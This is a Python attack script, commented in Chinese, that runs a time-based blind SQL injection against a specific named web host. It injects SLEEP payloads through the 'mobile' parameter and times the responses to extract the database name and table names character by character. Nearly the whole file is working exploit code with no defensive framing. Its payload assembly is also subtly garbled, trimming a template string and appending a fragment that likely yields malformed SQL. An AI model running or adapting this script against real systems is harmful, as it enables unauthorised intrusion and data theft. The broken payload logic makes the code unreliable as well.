import requests
import time

# 目标URL和参数
base_url = "http://oa.fspt.net:8088/taste/addTaste"
params = {
    "company": "1",
    "userName": "1",
    "openid": "1",
    "source": "1",
    "mobile": "1"
}

# 数据库名的字符范围
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# SQL注入payload
sql_injection_payload = "1' AND (SELECT 8094 FROM (SELECT(SLEEP(9-(IF(18015>3469,0,4)))))mKjk) OR 'KQZm'='REcX"

# 常规请求头
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

def send_request(payload):
    # 更新payload到参数中
    params['mobile'] = payload
    # 发送请求并记录响应时间
    start_time = time.time()
    response = requests.get(base_url, params=params, headers=headers)
    end_time = time.time()
    return end_time - start_time

def get_database_name():
    db_name = ""
    for i in range(1, 21):  # 假设数据库名长度不超过20
        for char in charset:
            payload = f"{sql_injection_payload[:-4]}(ORD(SUBSTRING((SELECT database()),{i},1))={ord(char)},0,4)))))a) -- "
            response_time = send_request(payload)
            if response_time > 9:  # 增加时间以确保检测
                db_name += char
                print(f"当前数据库名: {db_name}")
                break
    return db_name

def get_table_names(db_name):
    table_names = []
    for i in range(0, 100):  # 假设最多有100个表
        table_name = ""
        for j in range(1, 21):  # 假设表名长度不超过20
            for char in charset:
                payload = f"{sql_injection_payload[:-4]}(ORD(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1),{j},1))={ord(char)},0,4)))))a) -- "
                response_time = send_request(payload)
                if response_time > 9:  # 增加时间以确保检测
                    table_name += char
                    print(f"当前表名: {table_name}")
                    break
            if len(table_name) < j:
                break
        if not table_name:
            break
        table_names.append(table_name)
    return table_names

if __name__ == "__main__":
    db_name = get_database_name()
    print(f"数据库名: {db_name}")

    table_names = get_table_names(db_name)
    print("表名列表:")
    for table_name in table_names:
        print(table_name)
